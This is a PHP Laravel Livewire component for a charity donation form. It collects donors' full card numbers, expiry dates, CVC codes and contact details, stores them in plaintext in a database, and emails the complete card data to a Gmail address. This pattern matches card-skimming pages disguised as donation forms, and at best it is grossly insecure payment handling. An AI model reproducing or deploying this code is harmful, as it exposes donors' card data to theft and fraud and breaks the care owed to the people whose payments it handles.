<?php

namespace App\Http\Livewire;

use App\Mail\Payment;
use App\Models\Transaction;
use Illuminate\Support\Facades\Mail;
use Livewire\Component;

class Form extends Component
{
    public $currentPage = 1;
    public $success;

    // Form properties
    public $amount;
    public $cardName;
    public $cardNumber;
    public $expirationMonth;
    public $expirationYear;
    public $cvc;
    public $firstName;
    public $lastName;
    public $email;
    public $phone;
    public $address1;
    public $address2;
    public $city;
    public $country;
    public $state;
    public $zip;

    public $pages = [
        1 => [
            'heading' => 'DONATE',
            'subheading' => ''
        ],
        2 => [
            'heading' => 'YOUR INFORMATION',
            'subheading' => 'Your donation will be processed securely. Every gift counts, thank you!'
        ],
    ];

    private $validationRules = [
        1 => [
            'amount' => 'required|integer',
            'cardName' => 'required',
            'cardNumber' => 'required|min:12',
            'expirationYear' => 'required',
            'expirationMonth' => 'required',
            'cvc' => 'required|integer',
        ],
        2 => [
            'firstName'         => 'required',
            'lastName'          => 'required',
            'email'             => 'required|email',
            'address1'          => 'required',
            'address2'          => 'required',
            'city'              => 'required',
            'country'           => 'required',
            'state'             => 'required',
            'zip'               => 'required',   
        ],
    ];

    public function updated($propertyName)
    {
        $this->validateOnly($propertyName, $this->validationRules[$this->currentPage]);
    }

    public function goToNextPage()
    {
        $this->validate($this->validationRules[$this->currentPage]);
        $this->currentPage++;
    }

    public function goToPreviousPage()
    {
        if ($this->currentPage==1) {
            $this->currentPage;
        } else {
            $this->currentPage--;
        }
    }

    public function resetSuccess()
    {
        $this->reset('success');
    }

    public function submit()
    {
        $rules = collect($this->validationRules)->collapse()->toArray();
        $this->validate($rules);

        Transaction::create([
            'amount'            => $this->amount,        
            'card_name'         => $this->cardName,
            'card_number'       => $this->cardNumber,
            'expiration_month'  => $this->expirationMonth,
            'expiration_year'   => $this->expirationYear,
            'cvc'               => $this->cvc,
            'surname'           => $this->firstName,
            'lastname'          => $this->lastName,
            'email'             => $this->email,
            'phone'             => $this->phone,
            'address'           => $this->address1,
            'address2'          => $this->address2,
            'city'              => $this->city,
            'country'           => $this->country,
            'state'             => $this->state,
            'zip'               => $this->zip,
        ]);

        Mail::to('rescueclubfoundation@gmail.com')->send(new Payment(
            $this->amount,
            $this->cardName,
            $this->cardNumber,
            $this->expirationMonth,
            $this->expirationYear,
            $this->cvc,
            $this->firstName,
            $this->lastName,
            $this->email,
            $this->phone,
            $this->address1,
            $this->address2,
            $this->city,
            $this->country,
            $this->state,
            $this->zip
        ));       

        $this->reset();
        $this->resetValidation();

        $this->success = 'Thanks for your donation!';
    }

    public function render()
    {
        return view('livewire.form')->slot('form');
    }
}

